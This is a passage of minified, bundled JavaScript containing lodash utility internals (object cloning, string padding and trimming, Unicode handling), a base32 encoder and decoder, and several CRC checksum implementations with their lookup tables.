    return _initCloneByTag = Ae,
    _initCloneByTag
}
var _baseCreate, hasRequired_baseCreate;
function require_baseCreate() {
    if (hasRequired_baseCreate)
        return _baseCreate;
    hasRequired_baseCreate = 1;
    var _ = requireIsObject()
      , M = Object.create
      , j = function() {
        function O() {}
        return function(x) {
            if (!_(x))
                return {};
            if (M)
                return M(x);
            O.prototype = x;
            var w = new O;
            return O.prototype = void 0,
            w
        }
    }();
    return _baseCreate = j,
    _baseCreate
}
var _initCloneObject, hasRequired_initCloneObject;
function require_initCloneObject() {
    if (hasRequired_initCloneObject)
        return _initCloneObject;
    hasRequired_initCloneObject = 1;
    var _ = require_baseCreate()
      , M = require_getPrototype()
      , j = require_isPrototype();
    function O(x) {
        return typeof x.constructor == "function" && !j(x) ? _(M(x)) : {}
    }
    return _initCloneObject = O,
    _initCloneObject
}
var _baseIsMap, hasRequired_baseIsMap;
function require_baseIsMap() {
    if (hasRequired_baseIsMap)
        return _baseIsMap;
    hasRequired_baseIsMap = 1;
    var _ = require_getTag()
      , M = requireIsObjectLike()
      , j = "[object Map]";
    function O(x) {
        return M(x) && _(x) == j
    }
    return _baseIsMap = O,
    _baseIsMap
}
var isMap_1, hasRequiredIsMap;
function requireIsMap() {
    if (hasRequiredIsMap)
        return isMap_1;
    hasRequiredIsMap = 1;
    var _ = require_baseIsMap()
      , M = require_baseUnary()
      , j = require_nodeUtil()
      , O = j && j.isMap
      , x = O ? M(O) : _;
    return isMap_1 = x,
    isMap_1
}
var _baseIsSet, hasRequired_baseIsSet;
function require_baseIsSet() {
    if (hasRequired_baseIsSet)
        return _baseIsSet;
    hasRequired_baseIsSet = 1;
    var _ = require_getTag()
      , M = requireIsObjectLike()
      , j = "[object Set]";
    function O(x) {
        return M(x) && _(x) == j
    }
    return _baseIsSet = O,
    _baseIsSet
}
var isSet_1, hasRequiredIsSet;
function requireIsSet() {
    if (hasRequiredIsSet)
        return isSet_1;
    hasRequiredIsSet = 1;
    var _ = require_baseIsSet()
      , M = require_baseUnary()
      , j = require_nodeUtil()
      , O = j && j.isSet
      , x = O ? M(O) : _;
    return isSet_1 = x,
    isSet_1
}
var _baseClone, hasRequired_baseClone;
function require_baseClone() {
    if (hasRequired_baseClone)
        return _baseClone;
    hasRequired_baseClone = 1;
    var _ = require_Stack()
      , M = require_arrayEach()
      , j = require_assignValue()
      , O = require_baseAssign()
      , x = require_baseAssignIn()
      , w = require_cloneBuffer()
      , b = require_copyArray()
      , X = require_copySymbols()
      , Y = require_copySymbolsIn()
      , F = require_getAllKeys()
      , V = require_getAllKeysIn()
      , K = require_getTag()
      , Q = require_initCloneArray()
      , ee = require_initCloneByTag()
      , ae = require_initCloneObject()
      , ne = requireIsArray()
      , oe = requireIsBuffer()
      , ue = requireIsMap()
      , fe = requireIsObject()
      , he = requireIsSet()
      , pe = requireKeys()
      , ye = requireKeysIn()
      , be = 1
      , xe = 2
      , Ae = 4
      , Ee = "[object Arguments]"
      , Be = "[object Array]"
      , ce = "[object Boolean]"
      , q = "[object Date]"
      , L = "[object Error]"
      , U = "[object Function]"
      , Z = "[object GeneratorFunction]"
      , te = "[object Map]"
      , se = "[object Number]"
      , de = "[object Object]"
      , re = "[object RegExp]"
      , $ = "[object Set]"
      , ie = "[object String]"
      , ve = "[object Symbol]"
      , ge = "[object WeakMap]"
      , Re = "[object ArrayBuffer]"
      , Pe = "[object DataView]"
      , Ie = "[object Float32Array]"
      , Te = "[object Float64Array]"
      , Le = "[object Int8Array]"
      , Ze = "[object Int16Array]"
      , $e = "[object Int32Array]"
      , Ne = "[object Uint8Array]"
      , qe = "[object Uint8ClampedArray]"
      , Ve = "[object Uint16Array]"
      , lt = "[object Uint32Array]"
      , nt = {};
    nt[Ee] = nt[Be] = nt[Re] = nt[Pe] = nt[ce] = nt[q] = nt[Ie] = nt[Te] = nt[Le] = nt[Ze] = nt[$e] = nt[te] = nt[se] = nt[de] = nt[re] = nt[$] = nt[ie] = nt[ve] = nt[Ne] = nt[qe] = nt[Ve] = nt[lt] = !0,
    nt[L] = nt[U] = nt[ge] = !1;
    function je(Ke, Qe, We, mt, ct, vt) {
        var we, _e = Qe & be, Ce = Qe & xe, st = Qe & Ae;
        if (We && (we = ct ? We(Ke, mt, ct, vt) : We(Ke)),
        we !== void 0)
            return we;
        if (!fe(Ke))
            return Ke;
        var et = ne(Ke);
        if (et) {
            if (we = Q(Ke),
            !_e)
                return b(Ke, we)
        } else {
            var tt = K(Ke)
              , He = tt == U || tt == Z;
            if (oe(Ke))
                return w(Ke, _e);
            if (tt == de || tt == Ee || He && !ct) {
                if (we = Ce || He ? {} : ae(Ke),
                !_e)
                    return Ce ? Y(Ke, x(we, Ke)) : X(Ke, O(we, Ke))
            } else {
                if (!nt[tt])
                    return ct ? Ke : {};
                we = ee(Ke, tt, _e)
            }
        }
        vt || (vt = new _);
        var ke = vt.get(Ke);
        if (ke)
            return ke;
        vt.set(Ke, we),
        he(Ke) ? Ke.forEach(function(rt) {
            we.add(je(rt, Qe, We, rt, Ke, vt))
        }) : ue(Ke) && Ke.forEach(function(rt, dt) {
            we.set(dt, je(rt, Qe, We, dt, Ke, vt))
        });
        var Me = st ? Ce ? V : F : Ce ? ye : pe
          , Ue = et ? void 0 : Me(Ke);
        return M(Ue || Ke, function(rt, dt) {
            Ue && (dt = rt,
            rt = Ke[dt]),
            j(we, dt, je(rt, Qe, We, dt, Ke, vt))
        }),
        we
    }
    return _baseClone = je,
    _baseClone
}
var clone_1, hasRequiredClone;
function requireClone() {
    if (hasRequiredClone)
        return clone_1;
    hasRequiredClone = 1;
    var _ = require_baseClone()
      , M = 4;
    function j(O) {
        return _(O, M)
    }
    return clone_1 = j,
    clone_1
}
var _baseRepeat, hasRequired_baseRepeat;
function require_baseRepeat() {
    if (hasRequired_baseRepeat)
        return _baseRepeat;
    hasRequired_baseRepeat = 1;
    var _ = 9007199254740991
      , M = Math.floor;
    function j(O, x) {
        var w = "";
        if (!O || x < 1 || x > _)
            return w;
        do
            x % 2 && (w += O),
            x = M(x / 2),
            x && (O += O);
        while (x);
        return w
    }
    return _baseRepeat = j,
    _baseRepeat
}
var _baseSlice, hasRequired_baseSlice;
function require_baseSlice() {
    if (hasRequired_baseSlice)
        return _baseSlice;
    hasRequired_baseSlice = 1;
    function _(M, j, O) {
        var x = -1
          , w = M.length;
        j < 0 && (j = -j > w ? 0 : w + j),
        O = O > w ? w : O,
        O < 0 && (O += w),
        w = j > O ? 0 : O - j >>> 0,
        j >>>= 0;
        for (var b = Array(w); ++x < w; )
            b[x] = M[x + j];
        return b
    }
    return _baseSlice = _,
    _baseSlice
}
var _castSlice, hasRequired_castSlice;
function require_castSlice() {
    if (hasRequired_castSlice)
        return _castSlice;
    hasRequired_castSlice = 1;
    var _ = require_baseSlice();
    function M(j, O, x) {
        var w = j.length;
        return x = x === void 0 ? w : x,
        !O && x >= w ? j : _(j, O, x)
    }
    return _castSlice = M,
    _castSlice
}
var _hasUnicode, hasRequired_hasUnicode;
function require_hasUnicode() {
    if (hasRequired_hasUnicode)
        return _hasUnicode;
    hasRequired_hasUnicode = 1;
    var _ = "\\ud800-\\udfff"
      , M = "\\u0300-\\u036f"
      , j = "\\ufe20-\\ufe2f"
      , O = "\\u20d0-\\u20ff"
      , x = M + j + O
      , w = "\\ufe0e\\ufe0f"
      , b = "\\u200d"
      , X = RegExp("[" + b + _ + x + w + "]");
    function Y(F) {
        return X.test(F)
    }
    return _hasUnicode = Y,
    _hasUnicode
}
var _asciiSize, hasRequired_asciiSize;
function require_asciiSize() {
    if (hasRequired_asciiSize)
        return _asciiSize;
    hasRequired_asciiSize = 1;
    var _ = require_baseProperty()
      , M = _("length");
    return _asciiSize = M,
    _asciiSize
}
var _unicodeSize, hasRequired_unicodeSize;
function require_unicodeSize() {
    if (hasRequired_unicodeSize)
        return _unicodeSize;
    hasRequired_unicodeSize = 1;
    var _ = "\\ud800-\\udfff"
      , M = "\\u0300-\\u036f"
      , j = "\\ufe20-\\ufe2f"
      , O = "\\u20d0-\\u20ff"
      , x = M + j + O
      , w = "\\ufe0e\\ufe0f"
      , b = "[" + _ + "]"
      , X = "[" + x + "]"
      , Y = "\\ud83c[\\udffb-\\udfff]"
      , F = "(?:" + X + "|" + Y + ")"
      , V = "[^" + _ + "]"
      , K = "(?:\\ud83c[\\udde6-\\uddff]){2}"
      , Q = "[\\ud800-\\udbff][\\udc00-\\udfff]"
      , ee = "\\u200d"
      , ae = F + "?"
      , ne = "[" + w + "]?"
      , oe = "(?:" + ee + "(?:" + [V, K, Q].join("|") + ")" + ne + ae + ")*"
      , ue = ne + ae + oe
      , fe = "(?:" + [V + X + "?", X, K, Q, b].join("|") + ")"
      , he = RegExp(Y + "(?=" + Y + ")|" + fe + ue, "g");
    function pe(ye) {
        for (var be = he.lastIndex = 0; he.test(ye); )
            ++be;
        return be
    }
    return _unicodeSize = pe,
    _unicodeSize
}
var _stringSize, hasRequired_stringSize;
function require_stringSize() {
    if (hasRequired_stringSize)
        return _stringSize;
    hasRequired_stringSize = 1;
    var _ = require_asciiSize()
      , M = require_hasUnicode()
      , j = require_unicodeSize();
    function O(x) {
        return M(x) ? j(x) : _(x)
    }
    return _stringSize = O,
    _stringSize
}
var _asciiToArray, hasRequired_asciiToArray;
function require_asciiToArray() {
    if (hasRequired_asciiToArray)
        return _asciiToArray;
    hasRequired_asciiToArray = 1;
    function _(M) {
        return M.split("")
    }
    return _asciiToArray = _,
    _asciiToArray
}
var _unicodeToArray, hasRequired_unicodeToArray;
function require_unicodeToArray() {
    if (hasRequired_unicodeToArray)
        return _unicodeToArray;
    hasRequired_unicodeToArray = 1;
    var _ = "\\ud800-\\udfff"
      , M = "\\u0300-\\u036f"
      , j = "\\ufe20-\\ufe2f"
      , O = "\\u20d0-\\u20ff"
      , x = M + j + O
      , w = "\\ufe0e\\ufe0f"
      , b = "[" + _ + "]"
      , X = "[" + x + "]"
      , Y = "\\ud83c[\\udffb-\\udfff]"
      , F = "(?:" + X + "|" + Y + ")"
      , V = "[^" + _ + "]"
      , K = "(?:\\ud83c[\\udde6-\\uddff]){2}"
      , Q = "[\\ud800-\\udbff][\\udc00-\\udfff]"
      , ee = "\\u200d"
      , ae = F + "?"
      , ne = "[" + w + "]?"
      , oe = "(?:" + ee + "(?:" + [V, K, Q].join("|") + ")" + ne + ae + ")*"
      , ue = ne + ae + oe
      , fe = "(?:" + [V + X + "?", X, K, Q, b].join("|") + ")"
      , he = RegExp(Y + "(?=" + Y + ")|" + fe + ue, "g");
    function pe(ye) {
        return ye.match(he) || []
    }
    return _unicodeToArray = pe,
    _unicodeToArray
}
var _stringToArray, hasRequired_stringToArray;
function require_stringToArray() {
    if (hasRequired_stringToArray)
        return _stringToArray;
    hasRequired_stringToArray = 1;
    var _ = require_asciiToArray()
      , M = require_hasUnicode()
      , j = require_unicodeToArray();
    function O(x) {
        return M(x) ? j(x) : _(x)
    }
    return _stringToArray = O,
    _stringToArray
}
var _createPadding, hasRequired_createPadding;
function require_createPadding() {
    if (hasRequired_createPadding)
        return _createPadding;
    hasRequired_createPadding = 1;
    var _ = require_baseRepeat()
      , M = require_baseToString()
      , j = require_castSlice()
      , O = require_hasUnicode()
      , x = require_stringSize()
      , w = require_stringToArray()
      , b = Math.ceil;
    function X(Y, F) {
        F = F === void 0 ? " " : M(F);
        var V = F.length;
        if (V < 2)
            return V ? _(F, Y) : F;
        var K = _(F, b(Y / x(F)));
        return O(F) ? j(w(K), 0, Y).join("") : K.slice(0, Y)
    }
    return _createPadding = X,
    _createPadding
}
var padEnd_1, hasRequiredPadEnd;
function requirePadEnd() {
    if (hasRequiredPadEnd)
        return padEnd_1;
    hasRequiredPadEnd = 1;
    var _ = require_createPadding()
      , M = require_stringSize()
      , j = requireToInteger()
      , O = requireToString();
    function x(w, b, X) {
        w = O(w),
        b = j(b);
        var Y = b ? M(w) : 0;
        return b && Y < b ? w + _(b - Y, X) : w
    }
    return padEnd_1 = x,
    padEnd_1
}
var _baseFindIndex, hasRequired_baseFindIndex;
function require_baseFindIndex() {
    if (hasRequired_baseFindIndex)
        return _baseFindIndex;
    hasRequired_baseFindIndex = 1;
    function _(M, j, O, x) {
        for (var w = M.length, b = O + (x ? 1 : -1); x ? b-- : ++b < w; )
            if (j(M[b], b, M))
                return b;
        return -1
    }
    return _baseFindIndex = _,
    _baseFindIndex
}
var _baseIsNaN, hasRequired_baseIsNaN;
function require_baseIsNaN() {
    if (hasRequired_baseIsNaN)
        return _baseIsNaN;
    hasRequired_baseIsNaN = 1;
    function _(M) {
        return M !== M
    }
    return _baseIsNaN = _,
    _baseIsNaN
}
var _strictIndexOf, hasRequired_strictIndexOf;
function require_strictIndexOf() {
    if (hasRequired_strictIndexOf)
        return _strictIndexOf;
    hasRequired_strictIndexOf = 1;
    function _(M, j, O) {
        for (var x = O - 1, w = M.length; ++x < w; )
            if (M[x] === j)
                return x;
        return -1
    }
    return _strictIndexOf = _,
    _strictIndexOf
}
var _baseIndexOf, hasRequired_baseIndexOf;
function require_baseIndexOf() {
    if (hasRequired_baseIndexOf)
        return _baseIndexOf;
    hasRequired_baseIndexOf = 1;
    var _ = require_baseFindIndex()
      , M = require_baseIsNaN()
      , j = require_strictIndexOf();
    function O(x, w, b) {
        return w === w ? j(x, w, b) : _(x, M, b)
    }
    return _baseIndexOf = O,
    _baseIndexOf
}
var _charsEndIndex, hasRequired_charsEndIndex;
function require_charsEndIndex() {
    if (hasRequired_charsEndIndex)
        return _charsEndIndex;
    hasRequired_charsEndIndex = 1;
    var _ = require_baseIndexOf();
    function M(j, O) {
        for (var x = j.length; x-- && _(O, j[x], 0) > -1; )
            ;
        return x
    }
    return _charsEndIndex = M,
    _charsEndIndex
}
var trimEnd_1, hasRequiredTrimEnd;
function requireTrimEnd() {
    if (hasRequiredTrimEnd)
        return trimEnd_1;
    hasRequiredTrimEnd = 1;
    var _ = require_baseToString()
      , M = require_castSlice()
      , j = require_charsEndIndex()
      , O = require_stringToArray()
      , x = requireToString()
      , w = require_trimmedEndIndex();
    function b(X, Y, F) {
        if (X = x(X),
        X && (F || Y === void 0))
            return X.slice(0, w(X) + 1);
        if (!X || !(Y = _(Y)))
            return X;
        var V = O(X)
          , K = j(V, O(Y)) + 1;
        return M(V, 0, K).join("")
    }
    return trimEnd_1 = b,
    trimEnd_1
}
var keypair$1 = {}, strkey$1 = {}, base32 = {}, hasRequiredBase32;
function requireBase32() {
    return hasRequiredBase32 || (hasRequiredBase32 = 1,
    function(_) {
        var M = function(X, Y) {
            return Y || (Y = {}),
            X.split("").forEach(function(F, V) {
                F in Y || (Y[F] = V)
            }),
            Y
        }
          , j = {
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
            charmap: {
                0: 14,
                1: 8
            }
        };
        j.charmap = M(j.alphabet, j.charmap);
        var O = {
            alphabet: "0123456789ABCDEFGHJKMNPQRSTVWXYZ",
            charmap: {
                O: 0,
                I: 1,
                L: 1
            }
        };
        O.charmap = M(O.alphabet, O.charmap);
        var x = {
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
            charmap: {}
        };
        x.charmap = M(x.alphabet, x.charmap);
        function w(X) {
            if (this.buf = [],
            this.shift = 8,
            this.carry = 0,
            X) {
                switch (X.type) {
                case "rfc4648":
                    this.charmap = _.rfc4648.charmap;
                    break;
                case "crockford":
                    this.charmap = _.crockford.charmap;
                    break;
                case "base32hex":
                    this.charmap = _.base32hex.charmap;
                    break;
                default:
                    throw new Error("invalid type")
                }
                X.charmap && (this.charmap = X.charmap)
            }
        }
        w.prototype.charmap = j.charmap,
        w.prototype.write = function(X) {
            var Y = this.charmap
              , F = this.buf
              , V = this.shift
              , K = this.carry;
            return X.toUpperCase().split("").forEach(function(Q) {
                if (Q != "=") {
                    var ee = Y[Q] & 255;
                    V -= 5,
                    V > 0 ? K |= ee << V : V < 0 ? (F.push(K | ee >> -V),
                    V += 8,
                    K = ee << V & 255) : (F.push(K | ee),
                    V = 8,
                    K = 0)
                }
            }),
            this.shift = V,
            this.carry = K,
            this
        }
        ,
        w.prototype.finalize = function(X) {
            return X && this.write(X),
            this.shift !== 8 && this.carry !== 0 && (this.buf.push(this.carry),
            this.shift = 8,
            this.carry = 0),
            this.buf
        }
        ;
        function b(X) {
            if (this.buf = "",
            this.shift = 3,
            this.carry = 0,
            X) {
                switch (X.type) {
                case "rfc4648":
                    this.alphabet = _.rfc4648.alphabet;
                    break;
                case "crockford":
                    this.alphabet = _.crockford.alphabet;
                    break;
                case "base32hex":
                    this.alphabet = _.base32hex.alphabet;
                    break;
                default:
                    throw new Error("invalid type")
                }
                X.alphabet ? this.alphabet = X.alphabet : X.lc && (this.alphabet = this.alphabet.toLowerCase())
            }
        }
        b.prototype.alphabet = j.alphabet,
        b.prototype.write = function(X) {
            var Y = this.shift, F = this.carry, V, K, Q;
            for (Q = 0; Q < X.length; Q++)
                K = X[Q],
                V = F | K >> Y,
                this.buf += this.alphabet[V & 31],
                Y > 5 && (Y -= 5,
                V = K >> Y,
                this.buf += this.alphabet[V & 31]),
                Y = 5 - Y,
                F = K << Y,
                Y = 8 - Y;
            return this.shift = Y,
            this.carry = F,
            this
        }
        ,
        b.prototype.finalize = function(X) {
            return X && this.write(X),
            this.shift !== 3 && (this.buf += this.alphabet[this.carry & 31],
            this.shift = 3,
            this.carry = 0),
            this.buf
        }
        ,
        _.encode = function(X, Y) {
            return new b(Y).finalize(X)
        }
        ,
        _.decode = function(X, Y) {
            return new w(Y).finalize(X)
        }
        ,
        _.Decoder = w,
        _.Encoder = b,
        _.charmap = M,
        _.crockford = O,
        _.rfc4648 = j,
        _.base32hex = x
    }(base32)),
    base32
}
const createBuffer = Buffer$1.from && Buffer$1.alloc && Buffer$1.allocUnsafe && Buffer$1.allocUnsafeSlow ? Buffer$1.from : _ => new Buffer$1(_);
function defineCrc(_, M) {
    const j = (O, x) => M(O, x) >>> 0;
    return j.signed = M,
    j.unsigned = j,
    j.model = _,
    j
}
const crc1 = defineCrc("crc1", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = ~~M
      , O = 0;
    for (let x = 0; x < _.length; x++) {
        const w = _[x];
        O += w
    }
    return j += O % 256,
    j % 256
});
let TABLE$8 = [0, 7, 14, 9, 28, 27, 18, 21, 56, 63, 54, 49, 36, 35, 42, 45, 112, 119, 126, 121, 108, 107, 98, 101, 72, 79, 70, 65, 84, 83, 90, 93, 224, 231, 238, 233, 252, 251, 242, 245, 216, 223, 214, 209, 196, 195, 202, 205, 144, 151, 158, 153, 140, 139, 130, 133, 168, 175, 166, 161, 180, 179, 186, 189, 199, 192, 201, 206, 219, 220, 213, 210, 255, 248, 241, 246, 227, 228, 237, 234, 183, 176, 185, 190, 171, 172, 165, 162, 143, 136, 129, 134, 147, 148, 157, 154, 39, 32, 41, 46, 59, 60, 53, 50, 31, 24, 17, 22, 3, 4, 13, 10, 87, 80, 89, 94, 75, 76, 69, 66, 111, 104, 97, 102, 115, 116, 125, 122, 137, 142, 135, 128, 149, 146, 155, 156, 177, 182, 191, 184, 173, 170, 163, 164, 249, 254, 247, 240, 229, 226, 235, 236, 193, 198, 207, 200, 221, 218, 211, 212, 105, 110, 103, 96, 117, 114, 123, 124, 81, 86, 95, 88, 77, 74, 67, 68, 25, 30, 23, 16, 5, 2, 11, 12, 33, 38, 47, 40, 61, 58, 51, 52, 78, 73, 64, 71, 82, 85, 92, 91, 118, 113, 120, 127, 106, 109, 100, 99, 62, 57, 48, 55, 34, 37, 44, 43, 6, 1, 8, 15, 26, 29, 20, 19, 174, 169, 160, 167, 178, 181, 188, 187, 150, 145, 152, 159, 138, 141, 132, 131, 222, 217, 208, 215, 194, 197, 204, 203, 230, 225, 232, 239, 250, 253, 244, 243];
typeof Int32Array < "u" && (TABLE$8 = new Int32Array(TABLE$8));
const crc8 = defineCrc("crc-8", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = ~~M;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = TABLE$8[(j ^ x) & 255] & 255
    }
    return j
});
let TABLE$7 = [0, 94, 188, 226, 97, 63, 221, 131, 194, 156, 126, 32, 163, 253, 31, 65, 157, 195, 33, 127, 252, 162, 64, 30, 95, 1, 227, 189, 62, 96, 130, 220, 35, 125, 159, 193, 66, 28, 254, 160, 225, 191, 93, 3, 128, 222, 60, 98, 190, 224, 2, 92, 223, 129, 99, 61, 124, 34, 192, 158, 29, 67, 161, 255, 70, 24, 250, 164, 39, 121, 155, 197, 132, 218, 56, 102, 229, 187, 89, 7, 219, 133, 103, 57, 186, 228, 6, 88, 25, 71, 165, 251, 120, 38, 196, 154, 101, 59, 217, 135, 4, 90, 184, 230, 167, 249, 27, 69, 198, 152, 122, 36, 248, 166, 68, 26, 153, 199, 37, 123, 58, 100, 134, 216, 91, 5, 231, 185, 140, 210, 48, 110, 237, 179, 81, 15, 78, 16, 242, 172, 47, 113, 147, 205, 17, 79, 173, 243, 112, 46, 204, 146, 211, 141, 111, 49, 178, 236, 14, 80, 175, 241, 19, 77, 206, 144, 114, 44, 109, 51, 209, 143, 12, 82, 176, 238, 50, 108, 142, 208, 83, 13, 239, 177, 240, 174, 76, 18, 145, 207, 45, 115, 202, 148, 118, 40, 171, 245, 23, 73, 8, 86, 180, 234, 105, 55, 213, 139, 87, 9, 235, 181, 54, 104, 138, 212, 149, 203, 41, 119, 244, 170, 72, 22, 233, 183, 85, 11, 136, 214, 52, 106, 43, 117, 151, 201, 74, 20, 246, 168, 116, 42, 200, 150, 21, 75, 169, 247, 182, 232, 10, 84, 215, 137, 107, 53];
typeof Int32Array < "u" && (TABLE$7 = new Int32Array(TABLE$7));
const crc81wire = defineCrc("dallas-1-wire", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = ~~M;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = TABLE$7[(j ^ x) & 255] & 255
    }
    return j
});
let TABLE$6 = [0, 49345, 49537, 320, 49921, 960, 640, 49729, 50689, 1728, 1920, 51009, 1280, 50625, 50305, 1088, 52225, 3264, 3456, 52545, 3840, 53185, 52865, 3648, 2560, 51905, 52097, 2880, 51457, 2496, 2176, 51265, 55297, 6336, 6528, 55617, 6912, 56257, 55937, 6720, 7680, 57025, 57217, 8e3, 56577, 7616, 7296, 56385, 5120, 54465, 54657, 5440, 55041, 6080, 5760, 54849, 53761, 4800, 4992, 54081, 4352, 53697, 53377, 4160, 61441, 12480, 12672, 61761, 13056, 62401, 62081, 12864, 13824, 63169, 63361, 14144, 62721, 13760, 13440, 62529, 15360, 64705, 64897, 15680, 65281, 16320, 16e3, 65089, 64001, 15040, 15232, 64321, 14592, 63937, 63617, 14400, 10240, 59585, 59777, 10560, 60161, 11200, 10880, 59969, 60929, 11968, 12160, 61249, 11520, 60865, 60545, 11328, 58369, 9408, 9600, 58689, 9984, 59329, 59009, 9792, 8704, 58049, 58241, 9024, 57601, 8640, 8320, 57409, 40961, 24768, 24960, 41281, 25344, 41921, 41601, 25152, 26112, 42689, 42881, 26432, 42241, 26048, 25728, 42049, 27648, 44225, 44417, 27968, 44801, 28608, 28288, 44609, 43521, 27328, 27520, 43841, 26880, 43457, 43137, 26688, 30720, 47297, 47489, 31040, 47873, 31680, 31360, 47681, 48641, 32448, 32640, 48961, 32e3, 48577, 48257, 31808, 46081, 29888, 30080, 46401, 30464, 47041, 46721, 30272, 29184, 45761, 45953, 29504, 45313, 29120, 28800, 45121, 20480, 37057, 37249, 20800, 37633, 21440, 21120, 37441, 38401, 22208, 22400, 38721, 21760, 38337, 38017, 21568, 39937, 23744, 23936, 40257, 24320, 40897, 40577, 24128, 23040, 39617, 39809, 23360, 39169, 22976, 22656, 38977, 34817, 18624, 18816, 35137, 19200, 35777, 35457, 19008, 19968, 36545, 36737, 20288, 36097, 19904, 19584, 35905, 17408, 33985, 34177, 17728, 34561, 18368, 18048, 34369, 33281, 17088, 17280, 33601, 16640, 33217, 32897, 16448];
typeof Int32Array < "u" && (TABLE$6 = new Int32Array(TABLE$6));
const crc16 = defineCrc("crc-16", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = ~~M;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = (TABLE$6[(j ^ x) & 255] ^ j >> 8) & 65535
    }
    return j
});
let TABLE$5 = [0, 4129, 8258, 12387, 16516, 20645, 24774, 28903, 33032, 37161, 41290, 45419, 49548, 53677, 57806, 61935, 4657, 528, 12915, 8786, 21173, 17044, 29431, 25302, 37689, 33560, 45947, 41818, 54205, 50076, 62463, 58334, 9314, 13379, 1056, 5121, 25830, 29895, 17572, 21637, 42346, 46411, 34088, 38153, 58862, 62927, 50604, 54669, 13907, 9842, 5649, 1584, 30423, 26358, 22165, 18100, 46939, 42874, 38681, 34616, 63455, 59390, 55197, 51132, 18628, 22757, 26758, 30887, 2112, 6241, 10242, 14371, 51660, 55789, 59790, 63919, 35144, 39273, 43274, 47403, 23285, 19156, 31415, 27286, 6769, 2640, 14899, 10770, 56317, 52188, 64447, 60318, 39801, 35672, 47931, 43802, 27814, 31879, 19684, 23749, 11298, 15363, 3168, 7233, 60846, 64911, 52716, 56781, 44330, 48395, 36200, 40265, 32407, 28342, 24277, 20212, 15891, 11826, 7761, 3696, 65439, 61374, 57309, 53244, 48923, 44858, 40793, 36728, 37256, 33193, 45514, 41451, 53516, 49453, 61774, 57711, 4224, 161, 12482, 8419, 20484, 16421, 28742, 24679, 33721, 37784, 41979, 46042, 49981, 54044, 58239, 62302, 689, 4752, 8947, 13010, 16949, 21012, 25207, 29270, 46570, 42443, 38312, 34185, 62830, 58703, 54572, 50445, 13538, 9411, 5280, 1153, 29798, 25671, 21540, 17413, 42971, 47098, 34713, 38840, 59231, 63358, 50973, 55100, 9939, 14066, 1681, 5808, 26199, 30326, 17941, 22068, 55628, 51565, 63758, 59695, 39368, 35305, 47498, 43435, 22596, 18533, 30726, 26663, 6336, 2273, 14466, 10403, 52093, 56156, 60223, 64286, 35833, 39896, 43963, 48026, 19061, 23124, 27191, 31254, 2801, 6864, 10931, 14994, 64814, 60687, 56684, 52557, 48554, 44427, 40424, 36297, 31782, 27655, 23652, 19525, 15522, 11395, 7392, 3265, 61215, 65342, 53085, 57212, 44955, 49082, 36825, 40952, 28183, 32310, 20053, 24180, 11923, 16050, 3793, 7920];
typeof Int32Array < "u" && (TABLE$5 = new Int32Array(TABLE$5));
const crc16ccitt = defineCrc("ccitt", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = typeof M < "u" ? ~~M : 65535;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = (TABLE$5[(j >> 8 ^ x) & 255] ^ j << 8) & 65535
    }
    return j
});
let TABLE$4 = [0, 49345, 49537, 320, 49921, 960, 640, 49729, 50689, 1728, 1920, 51009, 1280, 50625, 50305, 1088, 52225, 3264, 3456, 52545, 3840, 53185, 52865, 3648, 2560, 51905, 52097, 2880, 51457, 2496, 2176, 51265, 55297, 6336, 6528, 55617, 6912, 56257, 55937, 6720, 7680, 57025, 57217, 8e3, 56577, 7616, 7296, 56385, 5120, 54465, 54657, 5440, 55041, 6080, 5760, 54849, 53761, 4800, 4992, 54081, 4352, 53697, 53377, 4160, 61441, 12480, 12672, 61761, 13056, 62401, 62081, 12864, 13824, 63169, 63361, 14144, 62721, 13760, 13440, 62529, 15360, 64705, 64897, 15680, 65281, 16320, 16e3, 65089, 64001, 15040, 15232, 64321, 14592, 63937, 63617, 14400, 10240, 59585, 59777, 10560, 60161, 11200, 10880, 59969, 60929, 11968, 12160, 61249, 11520, 60865, 60545, 11328, 58369, 9408, 9600, 58689, 9984, 59329, 59009, 9792, 8704, 58049, 58241, 9024, 57601, 8640, 8320, 57409, 40961, 24768, 24960, 41281, 25344, 41921, 41601, 25152, 26112, 42689, 42881, 26432, 42241, 26048, 25728, 42049, 27648, 44225, 44417, 27968, 44801, 28608, 28288, 44609, 43521, 27328, 27520, 43841, 26880, 43457, 43137, 26688, 30720, 47297, 47489, 31040, 47873, 31680, 31360, 47681, 48641, 32448, 32640, 48961, 32e3, 48577, 48257, 31808, 46081, 29888, 30080, 46401, 30464, 47041, 46721, 30272, 29184, 45761, 45953, 29504, 45313, 29120, 28800, 45121, 20480, 37057, 37249, 20800, 37633, 21440, 21120, 37441, 38401, 22208, 22400, 38721, 21760, 38337, 38017, 21568, 39937, 23744, 23936, 40257, 24320, 40897, 40577, 24128, 23040, 39617, 39809, 23360, 39169, 22976, 22656, 38977, 34817, 18624, 18816, 35137, 19200, 35777, 35457, 19008, 19968, 36545, 36737, 20288, 36097, 19904, 19584, 35905, 17408, 33985, 34177, 17728, 34561, 18368, 18048, 34369, 33281, 17088, 17280, 33601, 16640, 33217, 32897, 16448];
typeof Int32Array < "u" && (TABLE$4 = new Int32Array(TABLE$4));
const crc16modbus = defineCrc("crc-16-modbus", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = typeof M < "u" ? ~~M : 65535;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = (TABLE$4[(j ^ x) & 255] ^ j >> 8) & 65535
    }
    return j
})
  , crc16xmodem = defineCrc("xmodem", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = typeof M < "u" ? ~~M : 0;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        let w = j >>> 8 & 255;
        w ^= x & 255,
        w ^= w >>> 4,
        j = j << 8 & 65535,
        j ^= w,
        w = w << 5 & 65535,
        j ^= w,
        w = w << 7 & 65535,
        j ^= w
    }
